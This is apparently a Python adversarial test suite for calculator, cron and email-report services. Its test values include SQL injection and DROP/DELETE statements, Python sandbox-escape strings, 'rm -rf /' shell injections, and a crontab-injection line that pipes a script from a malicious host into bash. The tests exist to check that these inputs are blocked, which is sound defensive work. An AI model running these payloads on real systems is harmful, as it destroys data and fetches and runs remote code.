"""
test_challenger_m3_adversarial.py — Empirical Adversarial Stress Test Suite for Milestone M3.

Author: Challenger 1 (EMPIRICAL CHALLENGER / critic & specialist)
Target Modules:
- app.services.calculator_service (R4)
- app.services.cron_service (R5)
- app.services.email_report_service (R6)

MANDATORY EMPIRICAL VERIFICATION CRITERIA:
1. Malicious SQL queries:
   - `SELECT * FROM users; DROP TABLE users;`
   - `INSERT INTO ...`, `UPDATE ...`, `DELETE FROM ...`, `TRUNCATE ...`, `ALTER ...`
   - Multi-statement chaining, SQL comments, CTE with DML, SELECT ... INTO
   -> 100% blocked and rejected.
2. Exotic mathematical expressions:
   - Division by zero: 10/0, 10//0, 10%0, (5-5)
   - Empty expression: "", "   "
   - Malicious sandbox escape & imports: `__import__('os').system('id')`, `import os`, `eval()`, `exec()`, `open()`
   - Huge exponentiation bombs: `9**9**9`, `2**10001`, `10**2000`, `factorial(101)`
3. Cron edge cases:
   - Malformed cron expressions: `* * *` (3 fields), out-of-bounds fields, step 0, inverted range
   - Deleting cron job without `DELETE_CONFIRMED` token (Tier 2 Reversible)
   - Prefix collision avoidance: deleting `job_a` must not delete `job_a_extended`
4. Email & Report edge cases:
   - Invalid recipients, missing SMTP configuration, resilient health report generation
"""

import asyncio
import base64
import math
import os
import unittest
from unittest.mock import AsyncMock, patch

from app.services.calculator_service import (
    CalculatorService,
    calculate,
    convert_units,
    evaluate_expression_safely,
    format_table_for_telegram,
    query_database,
    validate_read_only_sql,
)
from app.services.cron_service import (
    CONFIRMATION_REQUIRED_TOKEN,
    CronService,
    create_cron_job,
    delete_cron_job,
    list_cron_jobs,
    validate_cron_expression,
)
from app.services.email_report_service import (
    EmailReportService,
    generate_report,
    send_email,
)


class MockSshClientForCron:
    """Simulated host SSH client for crontab inspection and modification."""

    def __init__(self, initial_crontab: str = ""):
        self.crontab_content = initial_crontab
        self.executed_commands = []

    async def execute_command(self, command: str) -> str:
        self.executed_commands.append(command)

        if "crontab -l" in command:
            return self.crontab_content

        if "base64 -d | crontab -" in command:
            parts = command.split("'")
            if len(parts) >= 2:
                b64_payload = parts[1]
                self.crontab_content = base64.b64decode(b64_payload.encode("ascii")).decode("utf-8")
                return ""
            return "base64 decode error"

        if "crontab -r" in command:
            self.crontab_content = ""
            return ""

        return ""


# ──────────────────────────────────────────────────────────────────────────────
# 1. SQL Injection & Mutation Adversarial Suite (R4)
# ──────────────────────────────────────────────────────────────────────────────

class TestCalculatorServiceSqlAdversarial(unittest.IsolatedAsyncioTestCase):
    """Deep adversarial testing of SQL read-only vetting in CalculatorService."""

    def setUp(self):
        self.service = CalculatorService()

    async def test_01_malicious_sql_query_chaining_drop_table(self):
        """Must block `SELECT * FROM users; DROP TABLE users;`."""
        malicious_query = "SELECT * FROM users; DROP TABLE users;"
        # Direct validation check
        with self.assertRaises(ValueError) as cm:
            validate_read_only_sql(malicious_query)
        self.assertIn("chấm phẩy", str(cm.exception))

        # Full service call check
        res = await self.service.query_database(malicious_query)
        self.assertEqual(res["status"], "error")
        self.assertIn("Từ chối truy vấn bảo mật", res["message"])
        self.assertIn("chấm phẩy", res["message"])

    async def test_02_malicious_sql_insert_mutation_blocked(self):
        """Must block `INSERT INTO users (username) VALUES ('hacker')`."""
        queries = [
            "INSERT INTO users (username) VALUES ('hacker')",
            "insert into logs (event) values ('pwned')",
            "INSERT INTO config VALUES (1, 'val')",
        ]
        for q in queries:
            with self.assertRaises(ValueError):
                validate_read_only_sql(q)
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error", f"Query '{q}' should be blocked")

    async def test_03_malicious_sql_update_mutation_blocked(self):
        """Must block `UPDATE users SET is_admin = true`."""
        queries = [
            "UPDATE users SET is_admin = true",
            "update server_settings set maintenance = false where 1=1",
        ]
        for q in queries:
            with self.assertRaises(ValueError):
                validate_read_only_sql(q)
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error", f"Query '{q}' should be blocked")

    async def test_04_malicious_sql_delete_mutation_blocked(self):
        """Must block `DELETE FROM users WHERE 1=1`."""
        queries = [
            "DELETE FROM users WHERE 1=1",
            "delete from sessions where user_id is not null",
        ]
        for q in queries:
            with self.assertRaises(ValueError):
                validate_read_only_sql(q)
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error", f"Query '{q}' should be blocked")

    async def test_05_malicious_sql_truncate_and_alter_blocked(self):
        """Must block `TRUNCATE ...` and `ALTER ...`."""
        queries = [
            "TRUNCATE TABLE users",
            "truncate table audit_logs cascade",
            "ALTER TABLE users ADD COLUMN pwned boolean",
            "alter table users drop column password_hash",
        ]
        for q in queries:
            with self.assertRaises(ValueError):
                validate_read_only_sql(q)
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error", f"Query '{q}' should be blocked")

    async def test_06_malicious_sql_ddl_and_privileges_blocked(self):
        """Must block DROP, CREATE, GRANT, REVOKE, COPY."""
        queries = [
            "DROP TABLE users",
            "CREATE TABLE pwn (id int)",
            "GRANT ALL PRIVILEGES ON ALL TABLES TO public",
            "REVOKE ALL ON users FROM kirito",
            "COPY users TO '/tmp/pwn.txt'",
        ]
        for q in queries:
            with self.assertRaises(ValueError):
                validate_read_only_sql(q)
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error", f"Query '{q}' should be blocked")

    async def test_07_malicious_sql_comment_bypasses_blocked(self):
        """Must block inline and block comments used for injection."""
        queries = [
            "SELECT * FROM users -- bypass comment",
            "SELECT * FROM users /* inline comment */ WHERE id=1",
            "SELECT 1; -- comment",
        ]
        for q in queries:
            with self.assertRaises(ValueError) as cm:
                validate_read_only_sql(q)
            self.assertTrue("comment SQL" in str(cm.exception) or "chấm phẩy" in str(cm.exception))
            res = await self.service.query_database(q)
            self.assertEqual(res["status"], "error")

    async def test_08_malicious_sql_nested_and_cte_attacks_blocked(self):
        """Must block `SELECT ... INTO` and CTEs containing forbidden statements."""
        # SELECT INTO table
        with self.assertRaises(ValueError):
            validate_read_only_sql("SELECT * INTO malicious_table FROM sensitive_data")

        # CTE containing DELETE
        with self.assertRaises(ValueError):
            validate_read_only_sql("WITH deleted_users AS (DELETE FROM users RETURNING *) SELECT * FROM deleted_users")

        # CTE without SELECT
        with self.assertRaises(ValueError):
            validate_read_only_sql("WITH t AS (SELECT 1) INSERT INTO x SELECT * FROM t")

    async def test_09_empty_and_whitespace_sql(self):
        """Empty queries must return error gracefully."""
        for empty_q in ["", "   ", "\n\t"]:
            res = await self.service.query_database(empty_q)
            self.assertEqual(res["status"], "error")
            self.assertIn("không được để trống", res["message"])


# ──────────────────────────────────────────────────────────────────────────────
# 2. Mathematical Sandbox & Bomb Adversarial Suite (R4)
# ──────────────────────────────────────────────────────────────────────────────

class TestCalculatorServiceMathAdversarial(unittest.IsolatedAsyncioTestCase):
    """Deep adversarial testing of SafeMathEvaluator sandbox in CalculatorService."""

    def setUp(self):
        self.service = CalculatorService()

    async def test_01_division_by_zero_all_forms(self):
        """Division by zero (/), floor division (//), modulo (%) must fail gracefully."""
        zero_div_expressions = [
            "10 / 0",
            "10 // 0",
            "10 % 0",
            "100 / (10 - 10)",
            "50 / (2 * 0)",
            "1 / sin(0)",
        ]
        for expr in zero_div_expressions:
            res = await self.service.calculate(expr)
            self.assertEqual(res["status"], "error", f"Expression '{expr}' did not error on div-by-zero")
            self.assertTrue(
                "chia cho số 0" in res["message"].lower() or "lỗi" in res["message"].lower(),
                f"Unexpected message for '{expr}': {res['message']}",
            )

    async def test_02_empty_and_whitespace_expressions(self):
        """Empty and whitespace-only expressions must fail gracefully."""
        for expr in ["", "   ", "\n\t\r"]:
            res = await self.service.calculate(expr)
            self.assertEqual(res["status"], "error")
            self.assertIn("không được để trống", res["message"])

    async def test_03_sandbox_escape_import_injection_blocked(self):
        """Must block `__import__('os').system('id')` and import tricks."""
        attacks = [
            "__import__('os').system('id')",
            "__import__('subprocess').call(['ls', '-la'])",
            "import os",
            "from os import system",
        ]
        for attack in attacks:
            res = await self.service.calculate(attack)
            self.assertEqual(res["status"], "error", f"Attack '{attack}' was not blocked!")
            self.assertTrue(
                "không được phép" in res["message"].lower() or "cú pháp" in res["message"].lower(),
                f"Attack message unexpected: {res['message']}",
            )

    async def test_04_sandbox_escape_dunder_and_reflection_blocked(self):
        """Must block dunder attribute access, subclasses walking, and introspection."""
        attacks = [
            "(1).__class__.__bases__[0].__subclasses__()",
            "().__class__.__base__.__subclasses__()",
            "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']",
            "open('/etc/passwd')",
            "exec('x = 1')",
            "eval('2 + 2')",
            "globals()",
            "locals()",
        ]
        for attack in attacks:
            res = await self.service.calculate(attack)
            self.assertEqual(res["status"], "error", f"Introspection '{attack}' was not blocked!")

    async def test_05_exponential_bomb_9_pow_9_pow_9_blocked(self):
        """Must block giant exponential bomb `9**9**9` and huge powers."""
        bombs = [
            "9**9**9",
            "2**10001",
            "10**2000",
            "2**50000",
        ]
        for bomb in bombs:
            res = await self.service.calculate(bomb)
            self.assertEqual(res["status"], "error", f"Bomb '{bomb}' was not safely caught!")
            self.assertTrue(
                "tràn số" in res["message"].lower()
                or "giới hạn" in res["message"].lower()
                or "quá lớn" in res["message"].lower()
                or "lỗi" in res["message"].lower(),
                f"Unexpected bomb message: {res['message']}",
            )

    async def test_06_factorial_bomb_blocked(self):
        """Must block factorial bomb (> 100)."""
        bombs = ["factorial(101)", "factorial(99999)"]
        for bomb in bombs:
            res = await self.service.calculate(bomb)
            self.assertEqual(res["status"], "error")
            self.assertIn("giai thừa", res["message"].lower())

    async def test_07_complex_number_rejection(self):
        """Expressions resulting in complex numbers must be rejected."""
        res = await self.service.calculate("(-16)**0.5")
        self.assertEqual(res["status"], "error")
        self.assertIn("số phức", res["message"].lower())

    async def test_08_expression_exceeding_max_length(self):
        """Expressions exceeding 1000 characters must be rejected immediately."""
        long_expr = "1 + " * 350 + "1"  # > 1400 chars
        res = await self.service.calculate(long_expr)
        self.assertEqual(res["status"], "error")
        self.assertIn("quá dài", res["message"])

    async def test_09_financial_compound_interest_stress(self):
        """Compound interest calculation with invalid or extreme inputs."""
        # Negative principal or years
        res1 = await self.service.calculate("compound_interest(-1000, 0.05, 1, 5)")
        self.assertEqual(res1["status"], "error")

        # Exponent bomb
        res2 = await self.service.calculate("compound_interest(1000, 0.05, 1000, 100)")
        self.assertEqual(res2["status"], "error")

        # Normal valid compound interest
        res3 = await self.service.calculate("compound_interest(10000000, 0.07, 1, 2)")
        self.assertEqual(res3["status"], "success")
        self.assertAlmostEqual(res3["result"], 11449000.0, places=1)


# ──────────────────────────────────────────────────────────────────────────────
# 3. Cron Automation & Confirmation Gating Adversarial Suite (R5)
# ──────────────────────────────────────────────────────────────────────────────

class TestCronServiceAdversarial(unittest.IsolatedAsyncioTestCase):
    """Deep adversarial testing of CronService validation and confirmation gating."""

    def setUp(self):
        self.mock_ssh = MockSshClientForCron()
        self.service = CronService(ssh_client=self.mock_ssh)

    def test_01_cron_expression_syntax_malformed_fields(self):
        """Stress test validate_cron_expression against malformed strings."""
        # 3 fields, 4 fields, 6 fields
        malformed = [
            "* * *",
            "* *",
            "* * * *",
            "* * * * * *",
            "",
            "   ",
            "every 5 minutes",
        ]
        for expr in malformed:
            valid, err = validate_cron_expression(expr)
            self.assertFalse(valid, f"Expression '{expr}' should be invalid")
            self.assertIn("đúng 5 trường", err)

    def test_02_cron_expression_boundary_violations(self):
        """Out of bounds and semantic errors in cron fields."""
        cases = [
            ("-1 * * * *", "Phút"),
            ("60 * * * *", "Phút"),
            ("* -1 * * *", "Giờ"),
            ("* 24 * * *", "Giờ"),
            ("* * 0 * *", "Ngày trong tháng"),
            ("* * 32 * *", "Ngày trong tháng"),
            ("* * * 0 *", "Tháng"),
            ("* * * 13 *", "Tháng"),
            ("* * * * 8", "Thứ trong tuần"),
            ("*/0 * * * *", "phải là số nguyên dương"),
            ("50-20 * * * *", "không được lớn hơn"),
            ("* * * UNKNOWN_MONTH *", "Tháng"),
        ]
        for expr, err_keyword in cases:
            valid, err = validate_cron_expression(expr)
            self.assertFalse(valid, f"'{expr}' should be rejected")
            self.assertIn(err_keyword, err)

    async def test_03_delete_cron_job_without_confirm_token_strictly_vetoed(self):
        """Deleting cron job without exact DELETE_CONFIRMED must fail (Tier 2 Veto)."""
        invalid_tokens = [
            None,
            "",
            "YES",
            "CONFIRM",
            "CONFIRMED",
            "DELETE",
            "delete_confirmed",  # lowercase
            "DELETE_CONFIRMED ",  # whitespace
        ]
        for token in invalid_tokens:
            res = await self.service.delete_cron_job(name="test_job", confirm=token)
            self.assertEqual(res["status"], "error", f"Token '{token}' should be rejected!")
            self.assertIn("DELETE_CONFIRMED", res["message"])
            self.assertEqual(res.get("required_confirm"), CONFIRMATION_REQUIRED_TOKEN)

    async def test_04_delete_cron_job_prefix_collision_safety(self):
        """
        Verify that deleting job 'my_job' does NOT delete 'my_job_special' or 'my_job_2'.
        """
        initial_crontab = (
            "# AGENT_JOB: my_job | Daily cleanup\n"
            "0 0 * * * /usr/bin/cleanup\n"
            "# AGENT_JOB: my_job_special | Special task\n"
            "0 1 * * * /usr/bin/special\n"
            "# AGENT_JOB: my_job_2 | Task two\n"
            "0 2 * * * /usr/bin/two\n"
        )
        self.mock_ssh.crontab_content = initial_crontab

        # Delete 'my_job' with proper token
        res = await self.service.delete_cron_job(name="my_job", confirm="DELETE_CONFIRMED")
        self.assertEqual(res["status"], "success")

        # Verify that 'my_job_special' and 'my_job_2' are preserved intact
        self.assertNotIn("# AGENT_JOB: my_job | Daily cleanup", self.mock_ssh.crontab_content)
        self.assertNotIn("0 0 * * * /usr/bin/cleanup", self.mock_ssh.crontab_content)
        self.assertIn("# AGENT_JOB: my_job_special | Special task", self.mock_ssh.crontab_content)
        self.assertIn("0 1 * * * /usr/bin/special", self.mock_ssh.crontab_content)
        self.assertIn("# AGENT_JOB: my_job_2 | Task two", self.mock_ssh.crontab_content)
        self.assertIn("0 2 * * * /usr/bin/two", self.mock_ssh.crontab_content)

    async def test_05_create_cron_job_shell_injection_in_name_blocked(self):
        """Job names containing shell metacharacters or spaces must be rejected."""
        malicious_names = [
            "job; rm -rf /",
            "job && whoami",
            "job`id`",
            "job$(whoami)",
            "job|cat",
            "my cron job",
            "job\nwith_newline",
        ]
        for bad_name in malicious_names:
            res = await self.service.create_cron_job(
                name=bad_name,
                schedule="0 0 * * *",
                command="/bin/true",
            )
            self.assertEqual(res["status"], "error", f"Name '{bad_name}' should be rejected!")
            self.assertIn("không hợp lệ", res["message"])

    async def test_06_create_cron_job_newline_command_injection_blocked(self):
        """Commands containing newline characters must be rejected to prevent crontab injection."""
        injected_cmd = "/bin/check.sh\n* * * * * curl http://malicious.site/script | bash"
        res = await self.service.create_cron_job(
            name="check_job",
            schedule="0 0 * * *",
            command=injected_cmd,
        )
        self.assertEqual(res["status"], "error")
        self.assertIn("xuống dòng", res["message"])


# ──────────────────────────────────────────────────────────────────────────────
# 4. Email & Report Generation Adversarial Suite (R6)
# ──────────────────────────────────────────────────────────────────────────────

class TestEmailReportServiceAdversarial(unittest.IsolatedAsyncioTestCase):
    """Deep adversarial testing of EmailReportService."""

    def setUp(self):
        self.service = EmailReportService()

    async def test_01_send_email_invalid_recipients(self):
        """Must reject invalid recipient email addresses."""
        # 1. Local validation rejects empty or missing @ addresses immediately
        invalid_recipients_local = [
            "",
            "   ",
            "plainaddress",
            "no_at_symbol_at_all",
        ]
        for bad_to in invalid_recipients_local:
            res = await self.service.send_email(
                to=bad_to,
                subject="Test",
                body="Test body",
            )
            self.assertEqual(res["status"], "error", f"Recipient '{bad_to}' should be rejected locally")
            self.assertIn("không hợp lệ", res["message"])

        # 2. Malformed addresses with @ when SMTP is not configured also safely return error
        malformed_with_at = [
            "@missingusername.com",
            "missingdomain@",
        ]
        for bad_to in malformed_with_at:
            res = await self.service.send_email(
                to=bad_to,
                subject="Test",
                body="Test body",
            )
            self.assertEqual(res["status"], "error", f"Recipient '{bad_to}' should safely return status error")
            self.assertTrue(len(res["message"]) > 0)

    async def test_02_send_email_empty_subject_and_body(self):
        """Must reject empty subject or body."""
        res1 = await self.service.send_email(to="admin@local.host", subject="", body="Body text")
        self.assertEqual(res1["status"], "error")
        self.assertIn("tiêu đề", res1["message"].lower())

        res2 = await self.service.send_email(to="admin@local.host", subject="Subject", body="")
        self.assertEqual(res2["status"], "error")
        self.assertIn("nội dung", res2["message"].lower())

    async def test_03_generate_report_fallback_on_invalid_period(self):
        """Invalid period must fallback to 'today' without failing."""
        mock_monitor = AsyncMock()
        mock_monitor.get_system_health_report.return_value = {
            "status": "success",
            "overall_status": "NORMAL",
            "cpu": {"load_1m": "0.1", "status": "NORMAL"},
            "ram": {"total_mb": 16000, "used_mb": 4000, "usage_percent": 25.0, "status": "NORMAL"},
            "disk": {"size": "500G", "used": "100G", "usage_percent": 20.0, "status": "NORMAL"},
            "docker": {"containers": []},
        }
        service = EmailReportService(monitor_service=mock_monitor)

        res = await service.generate_report(report_type="health", period="invalid_period_xyz")
        self.assertEqual(res["status"], "success")
        self.assertEqual(res["period"], "today")
        self.assertIn("HÔM NAY", res["period_label"])

    async def test_04_generate_report_resilient_to_monitor_failure(self):
        """When monitor service throws an exception, report generation must not crash."""
        mock_monitor = AsyncMock()
        mock_monitor.get_system_health_report.side_effect = RuntimeError("Monitor connection timeout")
        service = EmailReportService(monitor_service=mock_monitor)

        res = await service.generate_report(report_type="health", period="today")
        self.assertEqual(res["status"], "success")
        self.assertIn("BÁO CÁO TỔNG HỢP SỨC KHỎE", res["report_text"])


if __name__ == "__main__":
    unittest.main()
